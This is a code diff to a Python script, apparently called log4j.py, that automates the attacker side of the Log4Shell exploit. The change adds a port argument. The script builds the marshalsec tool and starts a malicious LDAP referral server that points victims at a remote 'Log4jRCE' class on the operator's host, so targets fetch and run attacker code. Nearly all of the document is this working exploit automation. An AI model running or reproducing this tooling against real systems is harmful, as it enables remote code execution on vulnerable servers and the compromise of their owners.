@@ -17,9 +17,10 @@ try:
     print(f"{IPv4Address(sys.argv[1])}")
     # If it is valid it will assign the ip_range from the 3rd parameter.
     ip_addr = sys.argv[1]
+    port = sys.argv[2]
     print("Valid ip address entered through command-line.")
 except:
-    print("Run program with command-line argument for ip address. Please re-run the program. Example would be python3 log4j.py 192.168.1.132")
+    print("Run program with command-line argument for ip address. Please re-run the program. Example would be python3 log4j.py 192.168.1.132 8888")
     exit()
 
 #2. Change directory
@@ -30,7 +31,7 @@ subprocess.run(["mvn", "clean", "package", "-DskipTests"])
 
 #3. Run LDAP server. In terminal you need to add "" around the ip address. In subprocess.run this is not required.
 try:
-    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:8888/#Log4jRCE"])
+    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:{port}/#Log4jRCE"])
 except:
     print("Something went wrong. Please check that you have the correct ip address")
     
